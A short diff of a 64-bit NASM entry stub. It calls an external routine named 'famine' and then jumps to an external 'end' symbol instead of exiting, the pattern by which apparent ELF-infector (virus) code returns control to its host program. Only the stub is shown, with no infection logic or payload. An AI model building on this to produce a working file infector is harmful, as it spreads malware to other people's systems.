@@ -1,7 +1,9 @@
 BITS 64
 
 extern famine
-extern _end
+extern end
+
+default rel
 
 section .text
 global _start
@@ -10,10 +12,10 @@ _start:
 	push rdx
 	call famine
 
+	pop rdx
+
+	jmp end
+
+
 	;exit
 
-	pop rdx
-	mov rax, 60
-	xor rdi, rdi
-	syscall
-	ret
